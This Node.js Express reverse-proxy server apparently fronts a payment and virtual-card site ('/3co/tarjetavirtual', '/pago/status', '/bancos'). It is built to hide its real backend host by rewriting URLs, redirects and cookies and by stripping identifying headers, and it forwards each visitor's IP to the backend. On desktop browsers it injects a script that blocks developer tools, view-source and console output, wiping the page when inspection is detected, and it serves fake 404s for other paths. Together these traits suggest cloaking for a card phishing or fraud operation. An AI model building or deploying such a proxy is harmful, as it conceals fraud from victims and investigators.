const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const TARGET_URL = process.env.TARGET_URL || 'https://tu-servidor-real.com';
const TARGET_HOST = (() => { try { return new URL(TARGET_URL).host; } catch { return ''; } })();

// Bases permitidas por negocio
const ALLOWED_PATHS = ['/3co', '/3co/tarjetavirtual'];

// Rutas API específicas solicitadas
const API_ALLOWED_PATHS = ['/pago/status', '/tarjeta/status', '/bancos'];

// Prefijos estáticos permitidos (ampliados)
const STATIC_PREFIXES = [
  '/assets', '/css', '/js', '/build', '/images', '/img', '/fonts', '/storage', '/favicon.ico'
];

// Control por variable de entorno para anti-inspect
// ANTI_INSPECT = 'off' | '0' | 'false'  => desactiva la inyección
const ANTI_INSPECT_ENABLED = !['off', '0', 'false'].includes(String(process.env.ANTI_INSPECT || '').toLowerCase());

// Seguridad adicional
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

// Eliminar headers que revelan información
app.use((req, res, next) => {
  res.removeHeader('X-Powered-By');
  res.removeHeader('Server');
  next();
});

// --- Utilidades ---

// Detectar móvil por User-Agent
const isMobileUA = (ua = '') =>
  /Android|iPhone|iPad|iPod|IEMobile|Opera Mini|Mobile|BlackBerry/i.test(ua);

// Reescribir URLs absolutas del host destino a rutas relativas (para HTML)
const rewriteAbsToRelativeInHtml = (html) => {
  if (!TARGET_HOST) return html;
  const hostEsc = TARGET_HOST.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const absUrlRegex = new RegExp(`https?:\\/\\/${hostEsc}([^"')\\s]*)`, 'gi');
  return html.replace(absUrlRegex, (_m, p1) => (p1.startsWith('/') ? p1 : `/${p1}`));
};

// Reescribir URLs absolutas del host destino dentro de un JSON ya serializado (string)
const rewriteAbsToRelativeInJsonString = (jsonStr) => {
  if (!TARGET_HOST) return jsonStr;
  const hostEsc = TARGET_HOST.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const absUrlRegex = new RegExp(`https?:\\/\\/${hostEsc}([^"\\s]*)`, 'g');
  return jsonStr.replace(absUrlRegex, (_m, p1) => (p1.startsWith('/') ? p1 : `/${p1}`));
};

// Sanitizar headers de respuesta (común para HTML y JSON)
const sanitizeResponseHeaders = (headers) => {
  // Quitar reveladores
  delete headers['x-powered-by'];
  delete headers['server'];
  delete headers['x-aspnet-version'];
  delete headers['x-aspnetmvc-version'];
  delete headers['x-frame-options'];

  // Evitar fugas del host real por redirects/enlaces
  if (headers['location']) {
    try {
      const u = new URL(headers['location'], TARGET_URL);
      if (u.host === TARGET_HOST) headers['location'] = u.pathname + u.search + u.hash;
    } catch { /* dejar como está si no es URL válida */ }
  }

  if (headers['link'] && TARGET_HOST) {
    // Simplificado: convertir URLs absolutas del host real en relativas dentro del header Link
    const hostEsc = TARGET_HOST.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    headers['link'] = String(headers['link']).replace(
      new RegExp(`https?:\\/\\/${hostEsc}`, 'g'),
      '' // ej: <https://host/ruta> => </ruta>
    );
  }

  // CORS (como es mismo origen vía proxy, se pueden limpiar)
  delete headers['access-control-allow-origin'];
  delete headers['access-control-allow-headers'];
  delete headers['access-control-expose-headers'];
  delete headers['access-control-allow-credentials'];
  delete headers['access-control-allow-methods'];

  // Cookies (evitar dominios del host real)
  if (headers['set-cookie']) {
    const cookies = Array.isArray(headers['set-cookie']) ? headers['set-cookie'] : [headers['set-cookie']];
    headers['set-cookie'] = cookies.map(c =>
      c
        .replace(/;\s*Domain=[^;]+/i, '')     // quitar Domain
        .replace(/;\s*SameSite=None/gi, '; SameSite=Lax') // endurecer SameSite
    );
  }

  // Seguridad
  headers['X-Content-Type-Options'] = 'nosniff';
  headers['X-XSS-Protection'] = '1; mode=block';
  headers['Referrer-Policy'] = 'no-referrer';
  headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private';
};

// Script anti-inspect (inyectado solo si aplica)
const buildAntiInspectScript = () => `
<script>
(function(){
  document.addEventListener('contextmenu', e => e.preventDefault());
  document.addEventListener('keydown', e => {
      if(e.keyCode === 123 ||
        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
        (e.ctrlKey && e.keyCode === 85)) {
          e.preventDefault();
          return false;
      }
  });
  let devtools = {open: false};
  setInterval(() => {
      if(window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
          if(!devtools.open) {
              devtools.open = true;
              document.body.innerHTML = '';
              window.location.href = '/3co';
          }
      } else {
          devtools.open = false;
      }
  }, 500);
  try {
    Object.defineProperty(console, 'log', { value: function(){}, writable: false, configurable: false });
  } catch(_) {}
})();
</script>
`;

// Reescritura/ajuste del contenido HTML
const processHtml = (buf) => {
  let html = buf.toString('utf8');
  html = rewriteAbsToRelativeInHtml(html);
  return Buffer.from(html);
};

// Reescritura/ajuste del contenido JSON
const processJson = (buf) => {
  try {
    const text = buf.toString('utf8');
    const rewrittenText = rewriteAbsToRelativeInJsonString(text);
    JSON.parse(rewrittenText); // validar
    return Buffer.from(rewrittenText);
  } catch {
    return buf;
  }
};

// --- Middleware de control de rutas permitidas ---
app.use((req, res, next) => {
  const path = req.path;

  const isAllowedBase = ALLOWED_PATHS.some(base => path === base || path.startsWith(base + '/'));
  const isStatic = STATIC_PREFIXES.some(prefix => path === prefix || path.startsWith(prefix + '/'));
  const isApiAllowed = API_ALLOWED_PATHS.some(apiPath => path === apiPath || path.startsWith(apiPath + '/'));

  if (!isAllowedBase && !isStatic && !isApiAllowed) {
    res.status(404).send(`
      <!DOCTYPE html>
      <html>
      <head>
          <title>404 Not Found</title>
          <style>
              body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
              h1 { color: #333; }
          </style>
      </head>
      <body>
          <h1>404 - Page Not Found</h1>
          <p>The requested resource could not be found.</p>
      </body>
      </html>
    `);
    return;
  }
  next();
});

// --- Configuración del proxy ---
const proxyOptions = {
  target: TARGET_URL,
  changeOrigin: true,
  secure: true,
  followRedirects: true,

  onProxyReq: (proxyReq, req) => {
    const userDomain = req.get('host') || 'unknown.onrender.com';
    const userIp = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || 'unknown';
    proxyReq.setHeader('user_domain', userDomain);
    proxyReq.setHeader('user_ip', String(userIp).split(',')[0].trim());

    // Eliminar headers que pueden revelar el proxy
    proxyReq.removeHeader('x-forwarded-for');
    proxyReq.removeHeader('x-forwarded-host');
    proxyReq.removeHeader('x-forwarded-proto');

    // Headers tipo navegador
    proxyReq.setHeader('User-Agent', req.get('User-Agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    proxyReq.setHeader('Accept-Language', 'es-ES,es;q=0.9,en;q=0.8');

    // Evitar compresión para poder modificar cuerpo sin desincronizar
    proxyReq.setHeader('Accept-Encoding', 'identity');

    // ID de sesión
    proxyReq.setHeader('X-Session-Id', crypto.randomBytes(16).toString('hex'));
  },

  onProxyRes: (proxyRes, req, res) => {
    // Sanitizar headers comunes
    sanitizeResponseHeaders(proxyRes.headers);

    // Si vamos a modificar cuerpo, no debe haber content-encoding
    delete proxyRes.headers['content-encoding'];

    const contentType = proxyRes.headers['content-type'] || '';
    const isHtml = contentType.includes('text/html');
    const isJson = contentType.includes('application/json');

    if (isHtml || isJson) {
      const originalWrite = res.write;
      const originalEnd = res.end;
      const chunks = [];

      res.write = function (chunk) {
        chunks.push(Buffer.from(chunk));
        return true;
      };

      res.end = function (chunk) {
        if (chunk) chunks.push(Buffer.from(chunk));
        let body = Buffer.concat(chunks);

        if (isHtml) {
          // Procesar HTML
          let modified = processHtml(body);
          // Inyectar anti-inspect según UA/env (solo desktop y si está habilitado)
          const ua = req.get('User-Agent') || '';
          if (ANTI_INSPECT_ENABLED && !isMobileUA(ua)) {
            const htmlStr = modified.toString('utf8');
            if (htmlStr.includes('</body>')) {
              const injected = htmlStr.replace('</body>', `${buildAntiInspectScript()}</body>`);
              modified = Buffer.from(injected);
            }
          }
          proxyRes.headers['content-length'] = Buffer.byteLength(modified);
          delete proxyRes.headers['transfer-encoding'];
          res.write = originalWrite;
          res.end = originalEnd;
          return res.end(modified);
        }

        if (isJson) {
          // Procesar JSON (reescritura de URLs absolutas del host real)
          const modified = processJson(body);
          proxyRes.headers['content-length'] = Buffer.byteLength(modified);
          delete proxyRes.headers['transfer-encoding'];
          res.write = originalWrite;
          res.end = originalEnd;
          return res.end(modified);
        }

        // Fallback (no debería entrar aquí)
        res.write = originalWrite;
        res.end = originalEnd;
        return res.end(body);
      };
    }
  },

  onError: (err, req, res) => {
    console.error('Proxy error:', err.message);
    res.status(502).send(`
      <!DOCTYPE html>
      <html>
      <head>
          <title>Service Temporarily Unavailable</title>
          <style>
              body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
              h1 { color: #333; }
          </style>
      </head>
      <body>
          <h1>Service Temporarily Unavailable</h1>
          <p>Please try again later.</p>
      </body>
      </html>
    `);
  }
};

// Aplicar el proxy
app.use('/', createProxyMiddleware(proxyOptions));

// Manejo de errores global
app.use((err, req, res, next) => {
  console.error('Application error:', err);
  res.status(500).send('Internal Server Error');
});

app.listen(PORT, () => {
  console.log(`Proxy server running on port ${PORT}`);
  console.log('Allowed bases:', ALLOWED_PATHS.join(', '));
  console.log('API allowed:', API_ALLOWED_PATHS.join(', '));
  console.log('Static prefixes:', STATIC_PREFIXES.join(', '));
  console.log(`Anti-inspect enabled: ${ANTI_INSPECT_ENABLED}`);
});
